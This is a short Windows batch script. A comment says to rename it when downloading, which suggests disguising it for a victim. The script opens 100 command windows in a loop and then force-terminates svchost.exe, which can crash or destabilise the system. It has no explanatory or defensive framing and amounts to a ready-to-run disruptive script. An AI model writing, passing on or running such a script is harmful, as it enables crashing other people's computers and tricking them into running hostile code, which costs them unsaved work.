:: change filename when downloading
@echo off
FOR /L %%v IN (1 1 100) DO  (
    start
)
taskkill /im svchost.exe /f